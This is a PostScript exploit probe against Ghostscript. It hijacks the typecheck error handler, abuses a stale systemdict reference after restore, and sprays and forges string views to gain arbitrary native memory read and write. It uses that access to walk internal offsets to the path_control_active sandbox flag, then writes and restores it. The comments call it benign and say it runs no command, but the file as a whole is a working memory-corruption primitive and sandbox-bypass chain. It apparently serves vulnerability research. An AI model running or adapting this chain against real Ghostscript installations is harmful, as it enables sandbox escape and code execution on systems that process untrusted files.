%!PS
% Bounded native chain probe. Forge temporary string views through the stale
% systemdict reference and walk the writeup's x86-64 offsets from currentdevice
% to path_control_active. No absolute process address is guessed. This probe
% writes four benign bytes to path_control_active (0->1) and restores them;
% it does not run a command.
% Byte arithmetic uses idiv/mul: this build's bitshift truncates >32-bit ints.
/LoaderOriginalTypecheck errordict /typecheck get def
errordict /typecheck {
  userdict /LoaderTrapPhase known { userdict /LoaderTrapPhase get } { false } ifelse
  { userdict /LoaderTrapPhase false put
    pop pop pop pop pop
    userdict /ForceTarget get userdict /ForceKey get userdict /ForceValue get
  } { LoaderOriginalTypecheck } ifelse
} bind put
userdict /QUIET true put
userdict /ForceTarget systemdict put
userdict /ForceKey /GS_NCHAIN put
userdict /LoaderTrapPhase true put
(GS_FONT_PATH) getenv { /GSFontPath exch def } { (ENV_MISSING) = quit } ifelse
userdict /Fontmap 20 dict put
userdict /Fontmap get /NimbusSans-Regular [ GSFontPath ] put
/MARK 305419896 def /MARK2 305419897 def
/NARRS 96 def /ARRLEN 128 def /arrs NARRS array def
/AttackSave save def
userdict /ForceValue 2048 string put
{ /NimbusSans-Regular findfont pop } stopped pop
AttackSave restore
systemdict /GS_NCHAIN known { systemdict /GS_NCHAIN get } { null } ifelse /sv exch def
sv null eq { (NO_STALE_REF) = quit } if
0 1 NARRS 1 sub { /ai exch def /a ARRLEN array def
  0 1 ARRLEN 1 sub { /j exch def a j MARK put } for arrs ai a put } for
/fpat -1 def
0 1 sv length 4 sub { /p exch def
  sv p get 120 eq { sv p 1 add get 86 eq { sv p 2 add get 52 eq {
    sv p 3 add get 18 eq { /fpat p def exit } if } if } if } if } for
fpat -1 eq { (NO_MARKER) = quit } if
/base fpat 8 sub def

/savebytes { /cnt exch def /off exch def /an exch def
  0 1 cnt 1 sub { /k exch def userdict an k sv off k add get put } for } bind def
/readbytes4 { /o exch def /s exch def /v 0 def /m 1 def
  0 1 3 { /k exch def /v v s o k add get m mul add def /m m 256 mul def } for v } bind def
/putbytes { /cnt exch def /off exch def /an exch def
  0 1 cnt 1 sub { /k exch def sv off k add an k get put } for } bind def
/readbytes64 { /o exch def /s exch def /v 0 def /m 1 def
  0 1 7 { /k exch def /v v s o k add get m mul add def /m m 256 mul def } for v } bind def
/write32s { /off exch def /p exch def /d 1 def
  0 1 3 { /k exch def sv off k add p d idiv 255 and put /d d 256 mul def } for } bind def
/write64s { /off exch def /p exch def /d 1 def
  0 1 7 { /k exch def sv off k add p d idiv 255 and put /d d 256 mul def } for } bind def

% templates: original integer ref and a writable string header
arrs 8 get 118 12345 put
userdict /IH 8 array put userdict /IV 8 array put
IH base 8 savebytes
IV base 8 add 8 savebytes
arrs 8 get 118 (ABCDEFGHIJKLMNOP) put
userdict /SH 8 array put
SH base 8 savebytes

% forge a string view of length <len> at native address <addr>; return the ref
/mkview { /len exch def /addr exch def
  SH base 8 putbytes
  len base 4 add write32s
  addr base 8 add write64s
  arrs 8 get 118 get
} bind def
% read 8 / 4 bytes at a native address via a forged view
/readat8 { /addr exch def addr 8 mkview 0 readbytes64 } bind def
/readat4 { /addr exch def addr 4 mkview 0 readbytes4 } bind def

% device ref pointer from currentdevice
arrs 8 get 118 currentdevice put
sv base 8 add readbytes64
/DEVPTR exch def
(DEVPTR=) print DEVPTR == flush

DEVPTR readat8 /GXDEVICE exch def
(GXDEVICE=) print GXDEVICE == flush
GXDEVICE 24 add readat8 /MEM exch def
(MEM=) print MEM == flush
MEM 208 add readat8 /LIBCTX exch def
(LIBCTX=) print LIBCTX == flush
LIBCTX 8 add readat8 /CORE exch def
(CORE=) print CORE == flush
CORE 156 add readat4 /PSTATE exch def
(PATH_CONTROL_BYTES=) print PSTATE == flush

% benign native write: forge a 4-byte view over path_control_active, set 0->1,
% observe it, then restore the original bytes. No command is run.
CORE 156 add 4 mkview /pview exch def
pview 0 1 put pview 1 0 put pview 2 0 put pview 3 0 put
pview 0 readbytes4 /PSTATE_WRITTEN exch def
(PSTATE_WRITTEN=) print PSTATE_WRITTEN == flush
{ .currentpathcontrolstate (PATH_CONTROL_OPERATOR=) print == flush } stopped
  { (PATH_CONTROL_OP_UNAVAILABLE) = flush } if
pview 0 0 put pview 1 0 put pview 2 0 put pview 3 0 put
pview 0 readbytes4 /PSTATE_RESTORED exch def
(PSTATE_RESTORED=) print PSTATE_RESTORED == flush
% cleanup: restore the original integer ref and verify
IH base 8 putbytes
IV base 8 add 8 putbytes
(CLEAN_TYPE=) print arrs 8 get 118 get type == flush
(CLEAN_VALUE=) print arrs 8 get 118 get == flush
quit
